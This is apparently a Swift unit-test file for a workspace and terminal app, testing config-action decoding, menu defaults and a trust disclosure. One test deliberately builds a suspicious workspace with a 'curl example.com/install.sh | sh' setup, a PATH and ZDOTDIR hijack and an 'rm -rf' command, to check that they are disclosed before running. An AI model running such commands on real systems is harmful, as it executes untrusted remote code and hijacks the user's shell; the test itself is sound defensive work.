import BreeWorkspaces
import Foundation
import Testing

#if canImport(Bree_Dev)
@testable import Bree_Dev
#elseif canImport(bree)
@testable import bree
#endif

/// Inline `type: "workspace"` config actions: decoding, resolution defaults,
/// plus-button menu auto-append, trust disclosure, and executor behavior.
struct BreeConfigWorkspaceActionTests {
    private func decode(_ json: String) throws -> BreeConfigFile {
        try JSONDecoder().decode(BreeConfigFile.self, from: Data(json.utf8))
    }

    private func workspaceAction(
        in config: BreeConfigFile,
        id: String
    ) throws -> (definition: BreeWorkspaceDefinition, restart: BreeRestartBehavior?) {
        let action = try #require(config.actions[id]?.action)
        return try #require(action.inlineWorkspace)
    }

    // MARK: - Decoding workspace actions

    @Test func decodeWorkspaceActionWithExplicitType() throws {
        let config = try decode("""
        {
          "actions": {
            "dev-setup": {
              "type": "workspace",
              "title": "Dev Setup",
              "restart": "recreate",
              "newWorkspaceMenu": true,
              "workspace": {
                "name": "Dev",
                "cwd": "~/code/app",
                "setup": "  git fetch --all  ",
                "layout": {
                  "direction": "horizontal",
                  "split": 0.4,
                  "children": [
                    { "pane": { "surfaces": [ { "type": "terminal", "command": "claude", "focus": true } ] } },
                    { "pane": { "surfaces": [ { "type": "browser", "url": "https://example.com" } ] } }
                  ]
                }
              }
            }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "dev-setup")
        #expect(inline.definition.name == "Dev")
        #expect(inline.definition.cwd == "~/code/app")
        #expect(inline.definition.setup == "git fetch --all")
        #expect(inline.restart == .recreate)
        #expect(config.actions["dev-setup"]?.newWorkspaceMenu == true)
        guard case .split(let split)? = inline.definition.layout else {
            Issue.record("Expected split layout")
            return
        }
        #expect(split.direction == .horizontal)
        #expect(split.children.count == 2)
    }

    @Test func decodeWorkspaceActionInferredFromWorkspaceKey() throws {
        let config = try decode("""
        {
          "actions": {
            "quick": {
              "title": "Quick",
              "workspace": { "name": "Quick" }
            }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "quick")
        #expect(inline.definition.name == "Quick")
        #expect(inline.restart == nil)
    }

    @Test func workspaceActionRequiresWorkspaceObject() {
        #expect(throws: (any Error).self) {
            try decode("""
            {
              "actions": {
                "broken": { "type": "workspace", "title": "Broken" }
              }
            }
            """)
        }
    }

    @Test func workspaceActionEncodeDecodeRoundTrip() throws {
        let definition = BreeWorkspaceDefinition(
            name: "Round Trip",
            cwd: "~/code",
            env: ["FOO": "bar"],
            setup: "make deps",
            layout: .split(BreeSplitDefinition(
                direction: .vertical,
                split: 0.3,
                children: [
                    .pane(BreePaneDefinition(surfaces: [
                        BreeSurfaceDefinition(type: .terminal, name: "Agent", command: "opencode", focus: true)
                    ])),
                    .pane(BreePaneDefinition(surfaces: [
                        BreeSurfaceDefinition(type: .browser, url: "https://example.com")
                    ])),
                ]
            ))
        )
        let original = BreeConfigActionDefinition(
            action: .workspace(definition, restart: .confirm),
            title: "Round Trip",
            newWorkspaceMenu: false
        )
        let data = try JSONEncoder().encode(original)
        let decoded = try JSONDecoder().decode(BreeConfigActionDefinition.self, from: data)
        #expect(decoded == original)
    }

    @Test func decodeBlankSetupBecomesNil() throws {
        let config = try decode("""
        {
          "actions": {
            "blank-setup": { "workspace": { "name": "X", "setup": "   " } }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "blank-setup")
        #expect(inline.definition.setup == nil)
    }

    // MARK: - Agent kinds

    @Test func decodeKnownAndCustomAgents() throws {
        let config = try decode("""
        {
          "actions": {
            "oc": { "type": "agent", "agent": "opencode" },
            "custom": { "type": "agent", "agent": "aider", "args": "--model gpt" }
          }
        }
        """)
        guard case .agent(let ocKind, _)? = config.actions["oc"]?.action else {
            Issue.record("Expected agent action")
            return
        }
        #expect(ocKind == .opencode)
        #expect(ocKind.commandName == "opencode")

        guard case .agent(let customKind, let args)? = config.actions["custom"]?.action else {
            Issue.record("Expected agent action")
            return
        }
        #expect(customKind == .custom("aider"))
        #expect(customKind.commandName == "aider")
        #expect(args == "--model gpt")
        #expect(config.actions["custom"]?.action?.terminalCommand == "aider --model gpt")
    }

    @Test func customAgentRejectsWhitespaceNames() {
        #expect(throws: (any Error).self) {
            try decode("""
            {
              "actions": {
                "bad": { "type": "agent", "agent": "aider --yolo" }
              }
            }
            """)
        }
    }

    @Test func agentEncodeRoundTrip() throws {
        for kind in [BreeConfigAgentKind.codex, .claudeCode, .opencode, .custom("goose")] {
            let data = try JSONEncoder().encode(kind)
            let decoded = try JSONDecoder().decode(BreeConfigAgentKind.self, from: data)
            #expect(decoded == kind)
        }
    }

    // MARK: - Resolved action defaults

    @Test func wantsNewWorkspaceMenuDefaults() throws {
        let workspaceAction = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "ws",
            definition: BreeConfigActionDefinition(
                action: .workspace(BreeWorkspaceDefinition(name: "W"), restart: nil)
            ),
            sourcePath: nil
        ))
        #expect(workspaceAction.wantsNewWorkspaceMenu)

        let commandAction = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "cmd",
            definition: BreeConfigActionDefinition(action: .command("make")),
            sourcePath: nil
        ))
        #expect(!commandAction.wantsNewWorkspaceMenu)

        let optedOut = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "ws2",
            definition: BreeConfigActionDefinition(
                action: .workspace(BreeWorkspaceDefinition(name: "W2"), restart: nil),
                newWorkspaceMenu: false
            ),
            sourcePath: nil
        ))
        #expect(!optedOut.wantsNewWorkspaceMenu)

        let optedIn = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "cmd2",
            definition: BreeConfigActionDefinition(
                action: .command("make"),
                newWorkspaceMenu: true
            ),
            sourcePath: nil
        ))
        #expect(optedIn.wantsNewWorkspaceMenu)
    }

    @Test func actionsAndLaunchersDiscoveryReportsEffectivePlacements() throws {
        let configPath = "/Users/test/.config/bree/bree.json"
        let shortcut = try #require(StoredShortcut.parseConfig("cmd+shift+r"))
        let agent = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "review-agent",
            definition: BreeConfigActionDefinition(
                action: .agent(.claudeCode, args: nil),
                title: "Review Agent",
                palette: true,
                shortcut: shortcut
            ),
            sourcePath: configPath
        ))
        let layout = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "review-layout",
            definition: BreeConfigActionDefinition(
                action: .workspace(BreeWorkspaceDefinition(name: "Review"), restart: nil),
                title: "Review Layout",
                palette: false,
                newWorkspaceMenu: true
            ),
            sourcePath: configPath
        ))
        let model = ActionsAndLaunchersDiscoveryModel.build(
            actions: [BreeResolvedConfigAction.builtIn(.newTerminal), layout, agent],
            resolvedNewWorkspaceActionID: layout.id,
            newWorkspaceMenuActionIDs: [layout.id],
            surfaceTabBarActionIDs: [agent.id]
        )

        #expect(model.entries.map(\.id) == [agent.id, layout.id])

        let agentEntry = try #require(model.entries.first { $0.id == agent.id })
        #expect(agentEntry.actionType == "agent")
        #expect(agentEntry.appearsInCommandPalette)
        #expect(!agentEntry.isNewWorkspaceDefault)
        #expect(!agentEntry.appearsInNewWorkspaceMenu)
        #expect(agentEntry.appearsInSurfaceTabBar)
        #expect(agentEntry.shortcutDisplay == shortcut.displayString)

        let layoutEntry = try #require(model.entries.first { $0.id == layout.id })
        #expect(layoutEntry.actionType == "workspace")
        #expect(!layoutEntry.appearsInCommandPalette)
        #expect(layoutEntry.isNewWorkspaceDefault)
        #expect(layoutEntry.appearsInNewWorkspaceMenu)
        #expect(!layoutEntry.appearsInSurfaceTabBar)
        #expect(layoutEntry.shortcutDisplay == nil)

        #expect(!model.entries.contains { $0.id == BreeSurfaceTabBarBuiltInAction.newTerminal.configID })
    }

    @Test func actionsDiscoveryDoesNotInferSurfacePlacementFromEqualPayloads() throws {
        let configPath = "/Users/test/.config/bree/bree.json"
        let first = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "first",
            definition: BreeConfigActionDefinition(
                action: .command("echo same"),
                title: "First"
            ),
            sourcePath: configPath
        ))
        let second = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "second",
            definition: BreeConfigActionDefinition(
                action: .command("echo same"),
                title: "Second"
            ),
            sourcePath: configPath
        ))

        let model = ActionsAndLaunchersDiscoveryModel.build(
            actions: [first, second],
            resolvedNewWorkspaceActionID: nil,
            newWorkspaceMenuActionIDs: [],
            surfaceTabBarActionIDs: [first.id]
        )

        #expect(model.entries.first { $0.id == first.id }?.appearsInSurfaceTabBar == true)
        #expect(model.entries.first { $0.id == second.id }?.appearsInSurfaceTabBar == false)
    }

    // MARK: - Executor

    @Test func inlineWorkspaceSyntheticCommandCarriesConfirm() throws {
        let action = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "confirm-me",
            definition: BreeConfigActionDefinition(
                action: .workspace(BreeWorkspaceDefinition(name: "C"), restart: .ignore),
                title: "Confirm Me",
                confirm: true
            ),
            sourcePath: nil
        ))
        let syntheticCommand = try #require(action.inlineWorkspaceSyntheticCommand)
        #expect(syntheticCommand.confirm == true)
        #expect(syntheticCommand.restart == .ignore)
        #expect(syntheticCommand.workspace?.name == "C")

        let button = BreeSurfaceTabBarButton(
            id: "confirm-button",
            title: "Confirm Button",
            action: .workspace(BreeWorkspaceDefinition(name: "B"), restart: nil),
            confirm: true
        )
        #expect(button.inlineWorkspaceSyntheticCommand?.confirm == true)
    }

    @MainActor
    @Test func workspaceShellDisclosureListsSetupCommandsAndEnv() {
        let command = BreeCommandDefinition(
            name: "Innocent Name",
            workspace: BreeWorkspaceDefinition(
                name: "W",
                cwd: "~/somewhere/else",
                env: ["ZDOTDIR": "/tmp/evil"],
                setup: "curl example.com/install.sh | sh",
                layout: .split(BreeSplitDefinition(
                    direction: .horizontal,
                    split: 0.5,
                    children: [
                        .pane(BreePaneDefinition(surfaces: [
                            BreeSurfaceDefinition(type: .terminal, command: "claude", env: ["PATH": "/tmp/bin"])
                        ])),
                        .pane(BreePaneDefinition(surfaces: [
                            BreeSurfaceDefinition(type: .browser, url: "https://example.com"),
                            BreeSurfaceDefinition(type: .terminal, command: "rm -rf ./scratch", cwd: "/tmp/target"),
                        ])),
                    ]
                ))
            )
        )

        let disclosure = BreeConfigExecutor.workspaceShellDisclosure(command)
        #expect(disclosure.hasPrefix("Innocent Name"))
        // Setup runs in the first terminal surface; its cwd is workspace-level
        // here (the first terminal has no cwd override), so the plain line shows.
        #expect(disclosure.contains("curl example.com/install.sh | sh"))
        #expect(disclosure.contains("claude"))
        // Env assignments, cwd values, and URLs change what executes and
        // where; they must be disclosed too.
        #expect(disclosure.contains("ZDOTDIR=/tmp/evil"))
        #expect(disclosure.contains("PATH=/tmp/bin"))
        #expect(disclosure.contains("cwd: ~/somewhere/else"))
        #expect(disclosure.contains("cwd /tmp/target: rm -rf ./scratch"))
        #expect(disclosure.contains("url: https://example.com"))

        let plain = BreeCommandDefinition(
            name: "Plain",
            workspace: BreeWorkspaceDefinition(name: "P")
        )
        #expect(BreeConfigExecutor.workspaceShellDisclosure(plain) == "Plain")
    }

    @MainActor
    @Test func inlineWorkspaceActionCreatesWorkspace() throws {
        let manager = TabManager(
            initialWorkingDirectory: NSTemporaryDirectory()
        )
        let action = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "dev-setup",
            definition: BreeConfigActionDefinition(
                action: .workspace(BreeWorkspaceDefinition(name: "Dev Setup"), restart: nil),
                title: "Dev Setup"
            ),
            sourcePath: nil
        ))

        #expect(BreeConfigExecutor.execute(
            action: action,
            commands: [],
            commandSourcePaths: [:],
            tabManager: manager,
            baseCwd: NSTemporaryDirectory(),
            globalConfigPath: "/tmp/bree-test-global-config.json"
        ))

        #expect(manager.tabs.count == 2)
        #expect(manager.selectedWorkspace?.customTitle == "Dev Setup")
        #expect(manager.selectedWorkspace?.effectiveCustomTitleSource == .auto)
    }

    @MainActor
    @Test func inlineWorkspaceSurfaceTabBarButtonExecutesOnClick() throws {
        let manager = TabManager()
        let workspace = try #require(manager.tabs.first)
        let button = BreeSurfaceTabBarButton(
            id: "review-setup",
            title: "Review Setup",
            action: .workspace(BreeWorkspaceDefinition(name: "Review"), restart: nil)
        )
        workspace.applySurfaceTabBarButtons(
            [button],
            sourcePath: nil,
            globalConfigPath: "/tmp/bree-test-global-config.json",
            terminalCommandSourcePaths: [:],
            workspaceCommands: [:]
        )

        let pane = try #require(workspace.bonsplitController.allPaneIds.first)
        workspace.splitTabBar(
            workspace.bonsplitController,
            didRequestCustomAction: "review-setup",
            inPane: pane
        )

        #expect(manager.tabs.count == 2, "inline workspace button click should create the workspace")
        #expect(manager.selectedWorkspace?.customTitle == "Review")
    }

    @MainActor
    @Test func inlineWorkspaceActionHonorsIgnoreRestart() throws {
        let manager = TabManager()
        let existingWorkspace = manager.tabs[0]
        existingWorkspace.setCustomTitle("Dev Setup")

        let action = try #require(BreeResolvedConfigAction.fromDefinition(
            id: "dev-setup",
            definition: BreeConfigActionDefinition(
                action: .workspace(BreeWorkspaceDefinition(name: "Dev Setup"), restart: .ignore),
                title: "Dev Setup"
            ),
            sourcePath: nil
        ))

        #expect(BreeConfigExecutor.execute(
            action: action,
            commands: [],
            commandSourcePaths: [:],
            tabManager: manager,
            baseCwd: NSTemporaryDirectory(),
            globalConfigPath: "/tmp/bree-test-global-config.json"
        ))

        #expect(manager.tabs.map(\.id) == [existingWorkspace.id])
        #expect(manager.selectedWorkspace?.id == existingWorkspace.id)
    }
}
